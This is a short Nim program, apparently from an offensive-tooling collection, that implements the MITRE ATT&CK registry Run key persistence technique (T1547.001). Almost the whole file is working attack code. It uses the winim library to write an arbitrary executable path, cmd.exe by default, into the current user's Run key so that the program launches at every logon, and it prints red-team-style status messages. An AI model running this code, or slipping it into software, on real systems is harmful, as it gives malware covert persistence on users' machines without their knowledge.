#[
    Enter a file to execute in the registry run folder
    https://attack.mitre.org/techniques/T1547/001/
    250 - https://github.com/khchen/winim/blob/b7b32603f4ef672bc34405bc6200e8aab2c366b1/winim/inc/winreg.nim

    Usage:
        registryRunFolder.exe [path_for_registry]
    Default:
        path_for_registry: %windir%\\system32\\cmd.exe
]#

import os
import winim
import winim/inc/winreg
import strformat

var
    hkey: HKEY

let
    index: DWORD = 4

proc registryRunFolder(codepath: string) =
    var reg = RegCreateKeyEx(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, nil, REG_OPTION_VOLATILE, KEY_WRITE, nil, &hkey, nil)

    if reg == ERROR_SUCCESS:
        defer: RegCloseKey(hkey)
        echo fmt"[+] Created the registry key for the programm {codepath}"
        var registrypath: LPCSTR = codepath #& "\0\0"
        var res = RegSetValueA(hkey, r"", REG_SZ, registrypath, index)

        if res == ERROR_SUCCESS:
            echo fmt"[+] Set value to path {registrypath}"
        else:
            echo fmt"[-] Unable to set the value to {registrypath}"
    else:
        echo "[-] Cannot create a new entry in the registry"


if paramCount() > 0:
    registryRunFolder(paramStr(1))
else:
    registryRunFolder("%windir%\\system32\\cmd.exe")

